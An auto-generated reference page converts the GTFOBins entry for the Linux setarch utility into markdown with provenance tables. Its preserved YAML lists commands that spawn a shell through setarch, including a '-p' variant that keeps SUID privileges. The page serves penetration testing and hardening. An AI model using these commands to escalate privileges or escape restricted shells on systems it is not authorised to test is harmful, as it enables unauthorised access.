---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# setarch

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `setarch` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/setarch` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [setarch](../../tools/linux/setarch.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | setarch |
| name | setarch |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/setarch/ |

## Preserved Source Material

```yaml
_body: ''
_name: setarch
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/setarch
functions:
  shell:
  - code: setarch -3 /bin/sh
    contexts:
      sudo: null
      suid:
        code: setarch -3 /bin/sh -p
        shell: false
      unprivileged: null
```
